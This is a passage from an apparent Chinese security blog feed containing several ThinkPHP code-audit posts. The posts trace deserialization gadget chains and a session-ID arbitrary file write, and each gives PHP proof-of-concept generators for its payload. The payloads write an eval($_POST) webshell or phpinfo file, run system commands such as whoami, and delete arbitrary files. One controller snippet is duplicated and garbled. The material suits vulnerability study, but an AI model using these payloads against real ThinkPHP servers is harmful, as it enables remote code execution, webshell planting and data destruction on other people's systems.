CacheStore extends AbstractCache &#123;        protected $key = &quot;1&quot;;        protected $store;        public function __construct($store=&quot;&quot;) &#123;            $this-&gt;store = $store;        &#125;    &#125;&#125;namespace think\cache &#123;    abstract class Driver &#123;        protected $options = [&quot;serialize&quot;=&gt;[&quot;system&quot;],&quot;expire&quot;=&gt;1,&quot;prefix&quot;=&gt;&quot;1&quot;,&quot;hash_type&quot;=&gt;&quot;sha256&quot;,&quot;cache_subdir&quot;=&gt;&quot;1&quot;,&quot;path&quot;=&gt;&quot;1&quot;];    &#125;&#125;namespace think\cache\driver &#123;    use think\cache\Driver;    class File extends Driver&#123;&#125;&#125;namespace &#123;    $file = new think\cache\driver\File();    $cache = new think\filesystem\CacheStore($file);    echo base64_encode(serialize($cache));&#125;?&gt;</code></pre><h3 id="PoC2"><a href="#PoC2" class="headerlink" title="PoC2"></a>PoC2</h3><p>继续跟进src&#x2F;think&#x2F;cache&#x2F;driver&#x2F;File.php中的set方法，该方法后面还调用了file_put_contents方法</p><p><img src="/../images/image-20240710122144858.png" alt="image-20240710122144858"></p><p>先跟进$filename，发现其又调用了getCacheKey方法</p><p><img src="/../images/image-20240710122338092.png" alt="image-20240710122338092"></p><p>继续跟进，这里的$this-&gt;options[‘hash_type’]是可控的，而$name也可控，所以hash后的文件名也可控，而$this-&gt;options[‘path’]则可以利用伪协议来指定路径</p><p><img src="/../images/image-20240710122453451.png" alt="image-20240710122453451"></p><p>再看$data，其来源于$this-&gt;serialize($value)，但是后面拼接时有exit()，可以使用php:&#x2F;&#x2F;filter绕过</p><p>那么至此就存在任意文件写入</p><pre><code class="php">&lt;?phpnamespace League\Flysystem\Cached\Storage &#123;    abstract class AbstractCache &#123;        protected $autosave = false;        protected $complete = &quot;uuuPD9waHAgcGhwaW5mbygpOw==&quot;;    &#125;&#125;namespace think\filesystem &#123;    use League\Flysystem\Cached\Storage\AbstractCache;    class CacheStore extends AbstractCache &#123;        protected $key = &quot;1&quot;;        protected $store;        public function __construct($store=&quot;&quot;) &#123;            $this-&gt;store = $store;        &#125;    &#125;&#125;namespace think\cache &#123;    abstract class Driver &#123;        protected $options = [&quot;serialize&quot;=&gt;[&quot;trim&quot;],&quot;expire&quot;=&gt;1,&quot;prefix&quot;=&gt;false,&quot;hash_type&quot;=&gt;&quot;md5&quot;,&quot;cache_subdir&quot;=&gt;false,&quot;path&quot;=&gt;&quot;php://filter/write=convert.base64-decode/resource=../&quot;,&quot;data_compress&quot;=&gt;0];    &#125;&#125;namespace think\cache\driver &#123;    use think\cache\Driver;    class File extends Driver&#123;&#125;&#125;namespace &#123;    $file = new think\cache\driver\File();    $cache = new think\filesystem\CacheStore($file);    echo urlencode(serialize($cache));&#125;?&gt;</code></pre><p><img src="/../images/image-20240710123707632.png" alt="image-20240710123707632"></p><h2 id="利用链3"><a href="#利用链3" class="headerlink" title="利用链3"></a>利用链3</h2><p>链子的起点和上一条链子一样，但是这里选择跟进vendor\league\flysystem-cached-adapter\src\Storage\Adapter.php的save方法</p><p>$contents来自$this-&gt;getForStorage()，后面处理也和上一条链子一样</p><p><img src="/../images/image-20240710140857921.png" alt="image-20240710140857921"></p><p>继续看下面的if，我们想要利用write()写文件就需要使has方法返回false</p><p>这里找一个同时有has和write方法的类 vendor\league\flysystem\src\Adapter\Local.php</p><p>先跟进has方法</p><p><img src="/../images/image-20240710142424159.png" alt="image-20240710142424159"></p><p>再跟进applyPathPrefix方法，该方法调用了getPathPrefix方法，而getPathPrefix方法中的$this-&gt;pathPrefix是可控的，ltrim删除字符串开头的\和&#x2F;。因此可以将可控的getPathPrefix作为文件路径，并且使得has方法执行file_exists时文件名不存在即可</p><p><img src="/../images/image-20240710142552073.png" alt="image-20240710142552073"></p><p>再看write方法，$location为经过applyPathPrefix方法处理的路径，$contents是经过json_encode处理后的json数据</p><p><img src="/../images/image-20240710143805789.png" alt="image-20240710143805789"></p><p><img src="/../images/image-20240710143722191.png" alt="image-20240710143722191"></p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><pre><code class="php">&lt;?phpnamespace League\Flysystem\Cached\Storage &#123;    abstract class AbstractCache &#123;        protected $autosave = false;        protected $cache = [&quot;p0l1st&quot; =&gt; &quot;&lt;?php phpinfo();?&gt;&quot;];    &#125;&#125;namespace League\Flysystem\Cached\Storage &#123;    use League\Flysystem\Cached\Storage\AbstractCache;    class Adapter extends AbstractCache &#123;        protected $file;        protected $adapter;        public function __construct($adapter = &quot;&quot;) &#123;            $this-&gt;file = &quot;../ppppp.php&quot;;            $this-&gt;adapter = $adapter;        &#125;    &#125;&#125;namespace League\Flysystem\Adapter &#123;    class Local &#123;        protected $writeFlags = 0;    &#125;&#125;namespace &#123;    $local = new League\Flysystem\Adapter\Local();    $cache = new League\Flysystem\Cached\Storage\Adapter($local);    echo urlencode(serialize($cache));&#125;?&gt;</code></pre><p><img src="/../images/image-20240710144420032.png" alt="image-20240710144420032"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;首先下载tp6.0.3&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;composer create-project topthink/th</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP6代码审计:任意文件写入</title>
    <link href="http://example.com/2024/07/09/ThinkPHP6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/"/>
    <id>http://example.com/2024/07/09/ThinkPHP6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5/</id>
    <published>2024-07-09T07:54:52.000Z</published>
    <updated>2024-07-09T09:52:14.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>首先composer安装thinkphp6框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp 6.0.0</span><br></pre></td></tr></table></figure><p>然后更改composer.json</p><p><img src="/../images/image-20240709160216239.png" alt="image-20240709160216239"></p><p>执行composer update</p><p>在app\middleware.php中开启tp6的session</p><p><img src="/../images/image-20240709160539190.png" alt="image-20240709160539190"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞影响版本：Thinkphp6.0.0-6.0.1</p><p>首先修改app&#x2F;controller&#x2F;index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">app</span>\<span class="title">BaseController</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">session</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V6&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;13载初心不改 - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP6&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload</p><p><img src="/../images/image-20240709163902501.png" alt="image-20240709163902501"></p><p>成功写入</p><p><img src="/../images/image-20240709164020192.png" alt="image-20240709164020192"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>我们先来看一下官方的Commit，修正sessionid检查的一处隐患</p><p><img src="/../images/image-20240709164616820.png" alt="image-20240709164616820"></p><p>猜测可能是存储session时导致可以写入文件，跟进 src&#x2F;think&#x2F;session&#x2F;Store.php</p><p><img src="/../images/image-20240709170203184.png" alt="image-20240709170203184"></p><p>跟进write方法，发现其又调用了writeFile方法</p><p><img src="/../images/image-20240709170628117.png" alt="image-20240709170628117"></p><p>继续跟进writeFile方法，可以看到该方法确实可以写文件</p><p><img src="/../images/image-20240709170749390.png" alt="image-20240709170749390"></p><p>既然可以写文件，我们再来看看文件名是否可控，文件名来自getId方法得到的sessionId</p><p><img src="/../images/image-20240709171721723.png" alt="image-20240709171721723"></p><p>再看setId，当$id长度满足32位时，将该值设置为$this-&gt;id，继续看调用setId的src&#x2F;think&#x2F;middleware&#x2F;SessionInit.php</p><p><img src="/../images/image-20240709171838444.png" alt="image-20240709171838444"></p><p><img src="/../images/image-20240709173015055.png" alt="image-20240709173015055"></p><p>可以看到$sessionId是可控的，可以通过$cookieName来设置其值，</p><p>并且跟进getName发现，$this-&gt;name的值是PHPSESSID，并且我们上面分析过，如果PHPSESSID的值满足32位就可以直接赋值，所以文件名也可控</p><p><img src="/../images/image-20240709174355159.png" alt="image-20240709174355159"></p><p>至于写入的内容，其实就是session的内容，如果没有开启session的话其实也是无法写入的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;首先composer安装thinkphp6框架&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.X反序列化利用链</title>
    <link href="http://example.com/2024/07/08/ThinkPHP5-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>http://example.com/2024/07/08/ThinkPHP5-0-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2024-07-08T09:37:28.000Z</published>
    <updated>2024-08-22T10:20:40.944Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>ThinkPHP5.0.24</p><p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp5.0.24&#39;;    &#125;&#125;&lt;?phpnamespace app\index\controller;&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp5.0.24&#39;;    &#125;&#125;class Index&#123;    public function index()    &#123;        $c = unserialize($_GET[&#39;c&#39;]);        var_dump($c);        return &#39;Welcome to thinkphp5.0.24&#39;;    &#125;&#125;</code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>全局搜索_destruct方法，选择Windows类</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221819169.png" alt="image-20240708174950463"></p><p>跟进removeFiles方法，这里和5.1.X版本一样，可以触发_toString方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221819940.png" alt="image-20240708175041345"></p><p>但是这里Request类的call_user_func_array写法和5.1.x不一样，成员变量也不可控</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221819508.png" alt="image-20240708180419948l"></p><p>所以我们需要寻找其他可利用的_call方法，这里用Output类，其call方法最终调用$this-&gt;handle-&gt;write</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820734.png" alt="image-20240708181630258"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820077.png" alt="image-20240708181810850"></p><p>那么接下来就需要找一个类的write方法来写文件</p><p>这里我们将Output类的handle属性设置成Memcache类，因为Memcache类的write方法调用了think&#x2F;cache&#x2F;driver&#x2F;File类的set方法，而File类的set方法可以写文件</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820800.png" alt="image-20240708201455607"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820958.png" alt="image-20240708201517979"></p><p>我们再跟进getCacheKey方法，可以看到$filename的前部分$this-&gt;options[‘path’]是可控的，但是$value&#x3D;true，其在Output类writeln方法中固定为true，所以set方法中写入的文件不可控</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820288.png" alt="image-20240708202332007"></p><p>再跟进setTagItem方法，发现$this-&gt;set($key, $value, 0)又调用了set方法，并且这里的value是可控的$filename，那么我们就可以用PHP伪协议来写shell</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820984.png" alt="image-20240708204047289"></p><p>再回到toArray方法，我们可以通过Model类912行的$value-&gt;getAttr($attr)来触发Output类的_call()方法，这里的$value就是Output类对象，在902行被赋值。</p><p>参数$modelRelation &#x3D; $this-&gt;$relation()实际上就是Model类任意方法的返回结果，这里选择最简单可控的getError方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820960.png" alt="image-20240708215515259"></p><p>再看getRelationData，这里的$this-&gt;parent就是Output对象，所以只需要满足下面的if条件语句即可。</p><p>这里Relation类的isSelfRelation和getModel返回值都可控，所以用Relation的子类套一下即可。</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820189.png" alt="image-20240708215942894"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820781.png" alt="image-20240708220234985"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820280.png" alt="image-20240708220250838"></p><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><pre><code class="php">&lt;?phpnamespace think;use think\model\relation\HasMany;class Process&#123;private $processPipes;private $status;private $processInformation;public function  __construct()&#123;$this-&gt;processInformation[&#39;running&#39;]=true;$this-&gt;status=3;$this-&gt;processPipes=new HasMany();&#125;&#125;namespace think;class Model&#123;&#125;namespace think\model;use think\Model;class Merge extends Model&#123;public $a=&#39;1&#39;;public function __construct()&#123;&#125;&#125;namespace think\model\relation;use think\console\Output;use think\db\Query;use think\model\Merge;use think\model\Relation;class HasMany extends Relation&#123;//protected $baseQuery=true;protected $parent;protected $localKey=&#39;a&#39;;protected $foreignKey=&#39;a&#39;;protected $pivot;public function __construct()&#123;$this-&gt;query=new Output();$this-&gt;parent= new Merge();&#125;&#125;namespace think\model;class Relation&#123;&#125;namespace think\db;class Query&#123;&#125;namespace think\console;class Output&#123;protected $styles = [&#39;info&#39;,&#39;error&#39;,&#39;comment&#39;,&#39;question&#39;,&#39;highlight&#39;,&#39;warning&#39;,&#39;getTable&#39;,&#39;where&#39;];private $handle;public function __construct()&#123;$this-&gt;handle = (new \think\session\driver\Memcache);&#125;&#125;namespace think\session\driver;class Memcache&#123;protected $handler;public function __construct()&#123;$this-&gt;handler = (new \think\cache\driver\Memcached);&#125;&#125;namespace think\cache\driver;class Memcached&#123;protected $tag;protected $options;protected $handler;public function __construct()&#123;$this-&gt;tag = true;$this-&gt;options = [&#39;expire&#39;   =&gt; 0,&#39;prefix&#39;   =&gt; &#39;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=&#39;,];$this-&gt;handler = (new File);&#125;&#125;class File&#123;protected $tag;protected $options;public function __construct()&#123;$this-&gt;tag = false;$this-&gt;options = [&#39;expire&#39;        =&gt; 3600,&#39;cache_subdir&#39;  =&gt; false,&#39;prefix&#39;        =&gt; &#39;&#39;,&#39;data_compress&#39; =&gt; false,&#39;path&#39;          =&gt; &#39;php://filter/convert.base64-decode/resource=./&#39;,];&#125;&#125;echo urlencode(serialize(new \think\Process()));</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;ThinkPHP5.0.24&lt;/p&gt;
&lt;p&gt;application&amp;#x2F;index&amp;#x2F;controller&amp;#</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.X反序列化利用链</title>
    <link href="http://example.com/2024/07/08/ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>http://example.com/2024/07/08/ThinkPHP5-1-X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2024-07-08T04:05:40.000Z</published>
    <updated>2024-08-22T10:22:06.133Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>ThinkPHP5.1.37</p><p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $u = unserialize($_GET[&#39;c&#39;]);        return &#39;hhh&#39;;    &#125;    public function hello($name = &#39;ThinkPHP5&#39;)    &#123;        return &#39;hello,&#39; . $name;    &#125;&#125;</code></pre><h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul><li>有一个内容完全可控的反序列化点:unserialize(可控变量)</li><li>存在文件上传、文件名可控、使用了文件操作函数:file_exists(‘phar:&#x2F;&#x2F;‘)</li></ul><h1 id="漏洞链"><a href="#漏洞链" class="headerlink" title="漏洞链"></a>漏洞链</h1><p>首先全局搜索_destruct()</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221820031.png" alt="image-20240708121433119"></p><p>然后跟进windows类的_destruct方法，发现调用了removeFiles方法，继续跟进</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821196.png" alt="image-20240708121529761"></p><p>可以看到在这里使用了file_exists对filename进行判断，这里的filename是可控的，并且跟进file_exists可以发现filename被当作字符串，那么就会触发_toString方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821254.png" alt="image-20240708121618417"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821679.png" alt="image-20240708121836989"></p><p>全局搜索可利用的_toString方法，选择Conversion类，发现调用了toJson方法，跟进看看</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821743.png" alt="image-20240708122013007"></p><p>又调用了toArray方法，继续跟进</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821049.png" alt="image-20240708122126632"></p><p>这里的$relation来自$this-&gt;data[$name]，$name来自$this-&gt;append，都是可控的</p><p>所以$relation-&gt;visible($name)就变成了：**可控类-&gt;visible(可控变量)**，接下来就需要找可利用的visible方法或_call方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821206.png" alt="image-20240708132448330"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821595.png" alt="image-20240708132131155"></p><p>全局搜索并没有找到可以利用的visible，搜索_call发现Request类比较好利用，这里的call_user_func_array第一个参数可控，可以传入一个数组，构造call_user_func_array(array(任意类，任意方法), $args)就可以调用任意类的任意方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821423.png" alt="image-20240708133414554"></p><p>但是array_unshift($args, $this)把本类对象放在$args的第一个，我们需要寻找不受这个参数影响的方法</p><p>通过前面分析RCE漏洞我们知道Request类中的input方法可以通过调用filterValue进而调用call_user_func，但是$args的第一个元素是一个固定死的类对象，所以这里不能直接调用input方法，而应该寻找调用input的方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821731.png" alt="image-20240708135710657"></p><p>调用input的方法共有七处，这里选择Request类中的param方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821875.png" alt="image-20240708140724987"></p><p>继续寻找调用了param的方法，发现有isAjax和isPjax，它们传入param方法的第一个参数都可控</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221821591.png" alt="image-20240708141254668"></p><p>至此漏洞链构造完成</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/10.png" alt="10"></p><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><p>任意文件删除</p><pre><code class="php">namespace think\process\pipes;class Pipes&#123;&#125;class Windows extends Pipes&#123;private $files = [];public function __construct()&#123;$this-&gt;files=[&#39;需要删除文件的路径&#39;];&#125;&#125;echo base64_encode(serialize(new Windows()));</code></pre><p>RCE</p><pre><code class="php">&lt;?phpnamespace think;abstract class Model&#123;    protected $append = [];    private $data = [];    function __construct()&#123;        $this-&gt;append = [&quot;poc&quot;=&gt;[&quot; &quot;,&quot; &quot;]];        $this-&gt;data = [&quot;poc&quot;=&gt;new Request()];    &#125;&#125;class Request&#123;    protected $hook = [];    protected $filter = &quot;system&quot;;    protected $mergeParam=true;    protected $param = [];    protected $config = [        // 表单请求类型伪装变量        &#39;var_method&#39;       =&gt; &#39;_method&#39;,        // 表单ajax伪装变量        &#39;var_ajax&#39;         =&gt; &#39;_ajax&#39;,        // 表单pjax伪装变量        &#39;var_pjax&#39;         =&gt; &#39;_pjax&#39;,        // PATHINFO变量名 用于兼容模式        &#39;var_pathinfo&#39;     =&gt; &#39;s&#39;,        // 兼容PATH_INFO获取        &#39;pathinfo_fetch&#39;   =&gt; [&#39;ORIG_PATH_INFO&#39;, &#39;REDIRECT_PATH_INFO&#39;, &#39;REDIRECT_URL&#39;],        // 默认全局过滤方法 用逗号分隔多个        &#39;default_filter&#39;   =&gt; &#39;&#39;,        // 域名根，如thinkphp.cn        &#39;url_domain_root&#39;  =&gt; &#39;&#39;,        // HTTPS代理标识        &#39;https_agent_name&#39; =&gt; &#39;&#39;,        // IP代理获取标识        &#39;http_agent_ip&#39;    =&gt; &#39;HTTP_X_REAL_IP&#39;,        // URL伪静态后缀        &#39;url_html_suffix&#39;  =&gt; &#39;html&#39;,    ];    function __construct()&#123;        $this-&gt;filter = &quot;system&quot;;//回调时调用的PHP函数        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#39;&#39;];//在isAjax方法传递给param方法的$name绕过param方法的一些操作，但主要是为了绕过input方法里面对$data的改变        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];//在__call里面调用isAjax        $this-&gt;mergeParam=true;//绕过param方法里的一些操作        $this-&gt;param=[&quot;whoami&quot;,&quot;&quot;];//input方法的$data,也是即将执行的命令    &#125;&#125;namespace think\process\pipes;use think\model\concern\Conversion;use think\model\Pivot;class Windows&#123;    private $files = [];    public function __construct()    &#123;        $this-&gt;files=[new Pivot()];    &#125;&#125;namespace think\model;use think\Model;class Pivot extends Model&#123;&#125;use think\process\pipes\Windows;echo urlencode(serialize(new Windows()));?&gt;&lt;?phpnamespace think\process\pipes&#123;    class Windows    &#123;        private $files = [];        public function __construct($files=[])        &#123;            $this-&gt;files = $files;        &#125;    &#125;&#125;namespace think\model\concern&#123;    trait Conversion    &#123;        protected $visible = [];        protected $relation = [];    &#125;    trait Attribute    &#123;        private $data = [];        private $withAttr = [];    &#125;&#125;namespace think&#123;    use think\model\concern\Conversion;    use think\model\concern\Attribute;    abstract class Model    &#123;        use Conversion;        use Attribute;        public function __construct($relation=[],$visible=[],$data=[],$withAttr=[])        &#123;            $this-&gt;relation = $relation;            $this-&gt;visible = $visible;            $this-&gt;data = $data;            $this-&gt;withAttr = $withAttr;        &#125;    &#125;&#125;namespace think\model&#123;    use think\Model;    class Pivot extends Model&#123;        public function __construct($relation=[],$visible=[],$data=[],$withAttr=[])        &#123;            parent::__construct($relation,$visible,$data,$withAttr);        &#125;    &#125;&#125;namespace&#123;    $relation = array(&quot;system&quot;=&gt;1);    $visible = array(&quot;system&quot;=&gt;1);    $data = array(&quot;system&quot;=&gt;&quot;whoami&quot;);    $withAttr = array(&quot;system&quot;=&gt;&quot;system&quot;);    $pivot = new think\model\Pivot($relation,$visible,$data,$withAttr);    $windows = new think\process\pipes\Windows(array($pivot));    echo urlencode(serialize($windows));&#125;</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221822658.png" alt="image-20240708142049120"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;ThinkPHP5.1.37&lt;/p&gt;
&lt;p&gt;application&amp;#x2F;index&amp;#x2F;controller&amp;#</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5代码审计:代码执行(三)</title>
    <link href="http://example.com/2024/07/01/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%B8%89/"/>
    <id>http://example.com/2024/07/01/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%B8%89/</id>
    <published>2024-07-01T07:12:38.000Z</published>
    <updated>2024-08-22T10:18:21.886Z</updated>
    
